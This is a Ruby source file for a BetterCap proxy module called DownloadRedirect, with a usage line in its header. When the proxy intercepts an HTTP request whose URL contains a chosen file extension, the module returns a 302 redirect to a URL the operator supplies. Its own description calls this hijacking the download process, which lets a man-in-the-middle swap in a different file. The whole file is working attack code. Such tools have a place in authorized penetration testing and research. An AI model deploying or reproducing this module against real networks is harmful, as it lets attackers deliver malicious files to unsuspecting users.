
=begin
BETTERCAP
Author : Mohamed Abdelbasset Elnouby - @SymbianSyMoh / @Seekurity
Email  : MaeBaset@Seekurity.com
Blog   : www.Seekurit.com/blog
Usage  : Bettercap -I INTERFACE -T TARGET --proxy-module download_redirect.rb --find-extension EXT --redirect-to-url http(s)://domain.tld/file.ext
This project is released under the GPL 3 license.
=end

require 'uri'
class DownloadRedirect < BetterCap::Proxy::HTTP::Module
  meta(
    'Name'        => 'DownloadRedirect',
    'Description' => 'Redirect a url which contains specific file extension to another url hence hijacking the download process.',
    'Version'     => '1.0.0',
    'Author'      => "Mohamed Abdelbasset Elnouby - @SymbianSyMoh / @Seekurity",
    'License'     => 'GPL3'
  )

  @@fileNameExtenstion = nil
  @@extension = nil
  @@url  = nil

  def self.on_options(opts)
    opts.on( '--find-extension EXT', 'Extension to find in the url.' ) do |v|
      @@extension = v
    end

    opts.on( '--redirect-to-url URL', 'Full url path with file extension to redirect to' ) do |v|
      @@url = v
    end
  end

  def initialize
    raise BetterCap::Error, "No --find-extension option specified for the proxy module." if @@extension.nil?
    raise BetterCap::Error, "No --redirect-to-url option specified for the proxy module." if @@url.nil?
  end

  def on_request( request, response )
    url = request.path
    uri = URI.parse(url)
    @@fileNameExtenstion = File.basename(uri.path)
    if request.path.include?(".#{@@extension}")
      BetterCap::Logger.info "Found extension:".green + " #{@@extension} in " + "url".green + ": http://#{request.host}#{request.path}"
      BetterCap::Logger.info "Requested file name:".green + " #{@@fileNameExtenstion}"
      BetterCap::Logger.info "Redirecting from:".green + " http://#{request.host}#{request.path} " + "to".green + " #{@@url}"
      response.status = 302
      response['Location'] = @@url
    end
  end
end
